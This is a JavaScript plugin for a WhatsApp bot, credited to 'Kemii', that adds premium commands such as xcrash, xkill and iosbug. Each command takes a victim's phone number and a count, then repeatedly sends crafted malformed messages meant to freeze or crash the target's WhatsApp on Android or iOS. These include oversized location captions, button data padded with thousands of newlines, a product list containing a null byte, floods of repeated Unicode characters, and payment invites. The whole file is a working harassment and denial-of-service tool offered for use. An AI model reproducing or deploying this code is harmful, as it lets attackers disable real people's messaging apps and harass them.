/*
  *  Script By Kemii
  *  Forbidden to share and delete my wm
  *  Facebook : kemii.houkii
  *  Github : dcodekemii
  *  Telegram : t.me/dcodekemi
  *  Breach : Kemii
  *  WhatsApp : wa.me/628816609112
*/

const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys')
const sleep = time => new Promise(res => setTimeout(res, time))

let handler = async(m, { conn, usedPrefix, command, text }) => {

switch (command) {
case 'xvir':
case "xstik":
case "xlist":
case "x24j":
case 'xuia':
case 'xmii':
case 'xforce':
case "xva":
case "xta":
case 'xcrash':
case "xbutton":
case "xbom":
case "xbug":
case "xkill":
case "xloc":
case "xdoc":
case "xhit": {
let [number, jumlah] = text.split `,`
if (!number) return conn.reply(m.chat, `• *Example :* ${usedPrefix + command} 6288980870067,20`, m)
if (!jumlah) return conn.reply(m.chat, `• *Example :* ${usedPrefix + command} 6288980870067,20`, m)
await m.react('🕒')
if (!(await conn.onWhatsApp(number))[0]?.exists) return conn.reply(m.chat, '*Nomor tidak terdaftar di WhatsApp*', m).then(() => m.react(''))
let hold = await hapusTanda(number)
let target = hold + '@s.whatsapp.net'
await android(target, jumlah)
await sleep(3000)
await m.react('☑️')
}
break
case "iosbug":
case 'iospc':
case "bug-ios":
case "ioslcy":
case "ioskill":
case "iosxs": {
let [number, jumlah] = text.split `,`
if (!number) return conn.reply(m.chat, `• *Example :* ${usedPrefix + command} 6288980870067,20`, m)
if (!jumlah) return conn.reply(m.chat, `• *Example :* ${usedPrefix + command} 6288980870067,20`, m)
await m.react('🕒')
if (!(await conn.onWhatsApp(number))[0]?.exists) return conn.reply(m.chat, '*Nomor tidak terdaftar di WhatsApp*', m).then(() => m.react(''))
let hold = await hapusTanda(number)
let target = hold + '@s.whatsapp.net'
await ios(target, jumlah)
await sleep(3000)
await m.react('☑️')
}
break
}
}
handler.command = handler.help = [
'xvir',
"xstik",
"xlist",
"x24j",
'xuia',
'xmii',
'xforce',
"xva",
"xta",
'xcrash',
"xbutton",
"xbom",
"xbug",
"xkill",
"xloc",
"xdoc",
"xhit",
"iosbug",
'iospc',
"bug-ios",
"ioslcy",
"ioskill",
"iosxs"
]
handler.tags = ["bug"]
handler.premium = true

module.exports = handler

async function hapusTanda(nomor) {
  let nomorBersih = nomor.replace(/[+-\s]/g, '');
  return nomorBersih;
}

async function lokasi(target) {
      var location = generateWAMessageFromContent(target, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': 'K3M11\n'.repeat(5000),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': target
      });
      return conn.relayMessage(target, location.message, {
        'participant': {
          'jid': target
        },
        'messageId': location.key.id
      });
    }

async function button(target) {
      var beton = generateWAMessageFromContent(target, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'subtitle': " "
              },
              'body': {
                'text': "K3M11"
              },
              'footer': {
                'text': "dcodekemii"
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': 'cta_url',
                  'buttonParamsJson': "{ display_text : 'K3M11 - H07D', url : , merchant_url :  }"
                }],
                'messageParamsJson': "\n".repeat(5000)
              }
            }
          }
        }
      }), {
        'userJid': target
      });
      return conn.relayMessage(target, beton.message, {
        'participant': {
          'jid': target
        },
        'messageId': beton.key.id
      });
    }
    
async function catalog(target) {
    var bug = generateWAMessageFromContent(target, proto.Message.fromObject({
        'listMessage': {
          'title': "K3M11" + "\0",
          'footerText': "K3M11",
          'description': "K3M11",
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': "anjay",
              'products': [{
                'productId': "4392524570816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': "4392524570816732",
              'jpegThumbnail': null
            },
            'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': 'puki',
        'contextInfo': {
          'expiration': 0x93a80,
          'ephemeralSettingTimestamp': "1679959486",
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': 'whatsapp',
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 0x2,
        'product_header_info': {
          'product_header_info_id': 0x4433e2e130,
          'product_header_is_rejected': false
        }
      }), {
        'userJid': target
      });
      return conn.relayMessage(target, bug.message, {
        'participant': {
          'jid': target
        },
        'messageId': bug.key.id
      });
    }
    async function android(target, jumlah) {
      for (let i = 0; i < jumlah; i++) {
        await lokasi(target);
        await button(target);
        await catalog(target);
        await sleep(5000);
      }
    }
    
    async function gatau(target) {
      await conn.relayMessage(target, {
        'extendedTextMessage': {
          'text': '.',
          'contextInfo': {
            'stanzaId': target,
            'participant': target,
            'quotedMessage': {
              'conversation': "؂ن؃؄ٽ؂ن؃؄ٽ" + 'ꦾ'.repeat(5000)
            },
            'disappearingMode': {
              'initiator': "CHANGED_IN_CHAT",
              'trigger': 'CHAT_SETTING'
            }
          },
          'inviteLinkGroupTypeV2': "DEFAULT"
        }
      }, {
        'participant': {
          'jid': target
        }
      }, {
        'messageId': null
      });
    }
    async function upi(target) {
      await conn.relayMessage(target, {
        'paymentInviteMessage': {
          'serviceType': "UPI",
          'expiryTimestamp': Date.now() + 86400000
        }
      }, {
        'participant': {
          'jid': target
        }
      });
    }
    async function fbpay(target) {
      await conn.relayMessage(target, {
        'paymentInviteMessage': {
          'serviceType': "FBPAY",
          'expiryTimestamp': Date.now() + 86400000
        }
      }, {
        'participant': {
          'jid': target
        }
      });
    }
    
    async function ios(target, jumlah) {
      for (let i = 0; i < jumlah; i++) {
        await gatau(target);
        await upi(target);
        await fbpay(target);
        await sleep(5000);
      }
    }